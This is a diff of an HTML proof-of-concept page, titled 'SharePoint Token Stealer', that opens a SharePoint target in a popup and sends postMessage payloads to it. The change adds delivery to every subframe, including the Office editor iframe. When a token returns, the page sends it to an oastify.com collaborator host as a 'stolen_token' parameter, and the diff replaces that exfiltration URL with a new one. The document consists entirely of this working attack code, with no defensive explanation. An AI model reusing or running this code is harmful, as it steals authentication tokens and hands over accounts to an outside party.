@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head> <title>SharePoint Popup Exploit</title> </head>
+<head> <title>SharePoint Popup Exploit V8</title> </head>
 <body>
-    <h1>SharePoint Token Stealer V7</h1>
+    <h1>SharePoint Token Stealer (Popup Method)</h1>
     <button onclick="startExploit()">Step 1: Open Target & Attack</button>
     <div id="status">Waiting...</div>
     <div id="log" style="border:1px solid #ccc; padding:10px; margin-top:10px;"></div>
@@ -35,10 +35,22 @@
             if (!popup) return;
             log("Launching attack...");
 
-            // Helper to send to popup
+            // Helper to send to popup and its subframes (The fix!)
             function send(payload) {
+                // 1. Send to Top Window
                 try { popup.postMessage(payload, "*"); } catch(e) {}
                 try { popup.postMessage(JSON.stringify(payload), "*"); } catch(e) {}
+
+                // 2. Send to All Subframes (The "OfficeApps" Editor is inside an iframe)
+                try {
+                    for (let i = 0; i < popup.frames.length; i++) {
+                        const frame = popup.frames[i];
+                        try { frame.postMessage(payload, "*"); } catch(e) {}
+                        try { frame.postMessage(JSON.stringify(payload), "*"); } catch(e) {}
+                    }
+                } catch(e) {
+                    log("Warning: Could not access subframes (CORS?)");
+                }
             }
 
             // 1. Register
@@ -90,7 +102,7 @@
 
                 if (token) {
                     log("SUCCESS! Token found.");
-                    fetch('https://vrqmc12vcdx229zf8rl0ms63wu2lqge5.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
+                    fetch('https://gh172msg2ynnsup0ycblcdwomfs6g24r.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
                 } else {
                     log("ERROR: Message received but Token field is empty or named differently.");
                 }
